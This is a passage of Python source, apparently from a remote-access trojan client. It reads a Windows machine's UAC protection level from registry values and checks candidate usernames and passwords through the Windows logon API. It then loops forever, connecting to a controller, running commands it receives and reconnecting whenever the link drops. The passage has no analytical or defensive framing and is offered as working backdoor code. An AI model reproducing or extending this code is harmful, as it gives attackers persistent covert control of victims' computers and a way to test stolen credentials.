        if ConsentPromptBehaviorAdmin == 2 and EnableLUA == 1 and PromptOnSecureDesktop == 1:
            return '3/3 (Maximum)'
        elif ConsentPromptBehaviorAdmin == 5 and EnableLUA == 1 and PromptOnSecureDesktop == 1:
            return '2/3 (Default)'
        elif ConsentPromptBehaviorAdmin == 5 and EnableLUA == 1 and PromptOnSecureDesktop == 0:
            return '1/3'
        elif (ConsentPromptBehaviorAdmin == 0 and EnableLUA == 1 and PromptOnSecureDesktop == 0) or EnableLUA == 0:
            return '0/3 (Disabled)'
        else:
            return None

    @staticmethod
    def logon_user(username, password):
        try:
            token = win32security.LogonUser(username, None, password, win32security.LOGON32_LOGON_INTERACTIVE,
                                            win32security.LOGON32_PROVIDER_DEFAULT)
            token.Close()
            return True
        except win32security.error as e:
            if e.winerror == winerror.ERROR_ACCOUNT_RESTRICTION:
                return True
            if e.winerror == winerror.ERROR_LOGON_FAILURE:
                return False
            return False


while True:
    client = Client()
    client.connect()
    while True:
        try:
            client.recv_commands()
        except socket.error as e:
            print(e)
            client.socket.close()
            client.socket = socket.socket()
            break
        except Exception as ex:
            print(ex)
            continue
